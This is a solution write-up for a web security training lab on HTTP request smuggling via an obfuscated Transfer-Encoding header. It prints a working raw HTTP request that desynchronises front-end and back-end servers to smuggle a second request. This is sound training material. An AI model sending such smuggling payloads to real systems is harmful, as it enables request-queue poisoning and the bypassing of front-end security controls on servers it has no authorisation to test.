# Lab 07 — HTTP request smuggling, obfuscating the TE header

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

**Entry point:** duplicate `Transfer-Encoding` headers — one obfuscated —
desynchronize front-end and back-end.

## Solution

Repeater, "Update Content-Length" **off**; send twice:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The front-end ignores the invalid `Transfer-encoding: cow` and uses
chunked; the back-end uses `Content-Length: 4` (body `5c\r\n`) → the rest
becomes `GPOST /` → response says **"Unrecognized method GPOST"** —
lab solved.
